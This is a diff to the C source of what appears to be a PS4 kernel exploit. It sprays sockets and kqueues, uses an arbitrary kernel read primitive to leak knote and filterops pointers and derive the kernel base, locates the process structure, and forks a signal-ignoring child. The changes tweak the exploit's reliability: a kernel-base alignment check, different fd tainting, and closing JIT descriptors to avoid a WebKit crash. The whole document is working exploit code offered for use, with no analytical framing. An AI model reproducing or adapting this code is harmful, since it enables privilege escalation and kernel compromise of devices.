@@ -393,13 +393,17 @@ unsigned long long find_struct_proc(struct opaque* o, int victim, unsigned long 
 int jitshm_create(int flags, unsigned long long size, int prot);
 int jitshm_alias(int fd, int prot);
 
-int main()
+extern int ps4_printf_fd;
+
+int main(int x)
 {
     if(!setuid(0))
         return 179;
+    unsigned long long* lr = ((char*)&x) - 8;
     char* not_close = mmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-#define TAINTFD(x) not_close[x / 8] |= 1 << (x % 8)
+#define TAINTFD(x) not_close[x] = 1
 #define NEWSOCK(x) do { x = new_socket(); TAINTFD(x); } while(0)
+    TAINTFD(ps4_printf_fd);
     unsigned long long idt_base;
     unsigned short idt_size;
     sidt(&idt_base, &idt_size);
@@ -418,7 +422,7 @@ int main()
     for(int i = 0; i < 256; i++)
     {
         q2 += (kq[i] = kqueue());
-        TAINTFD(kq[i]);
+        //TAINTFD(kq[i]); // gets closed down the road, so no need
     }
     printf("sockets=%d kqueues=%d\n", q1, q2);
     struct opaque o = {.master_sock = master_sock, .kevent_sock = kevent_sock, .spray_sock = spray_sock, .kq = kq};
@@ -458,14 +462,19 @@ int main()
         return 1;
     victim = spray_sock[victim];
     unsigned long long knote, kn_fop, f_detach, kernel_base;
-    do
-    {
+    /*do
+    {*/
         knote = kread64(&o, victim, ptrs[0] + kevent_sock * 8);
         kn_fop = kread64(&o, victim, knote + offsetof(struct knote, kn_fop));
         f_detach = kread64(&o, victim, kn_fop + offsetof(struct filterops, f_detach));
         kernel_base = f_detach - F_DETACH_OFFSET;
+    //}
+    if(kernel_base & 4095ull)
+    {
+        printf("error: kernel base mismatch: 0x%llx! (buggy arb r/w? wrong fw?)\n", kernel_base);
+        //kernel_base = idt_base - 0x1bbb9e0; // fallback
+        return 1;
     }
-    while(kernel_base & 4095ull);
     printf("kernel_base = 0x%llx\n", kernel_base);
     printf("f_detach = 0x%llx, offset = 0x%llx\n", f_detach, F_DETACH_OFFSET);
     unsigned long long struct_proc = find_struct_proc(&o, victim, kernel_base);
@@ -516,6 +525,9 @@ int main()
     write_to_victim(&o, 0);
     for(int i = 0; i < 256; i++)
         close(kq[i]);
+    // fix crash in webkit after running this
+    close(jit1);
+    close(jit2);
     if(!fork())
     {
         struct sigaction ignore = {
@@ -525,9 +537,12 @@ int main()
         };
         sigaction(SIGTERM, &ignore);
         sigaction(SIGKILL, &ignore);
-        for(int i = 0; i < 1024; i++)
-            if(!(not_close[i / 8] & (1 << (i % 8))))
-                close(i);
+        /*for(int i = 0; i < 8; i++)
+            close(i);*/
+        for(int i = 0; i < 16384; i++)
+            if(!not_close[i])
+                if(!close(i))
+                    printf("closed fd %d\n", i);
         for(;;)
             nanosleep("\xe8\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
     }
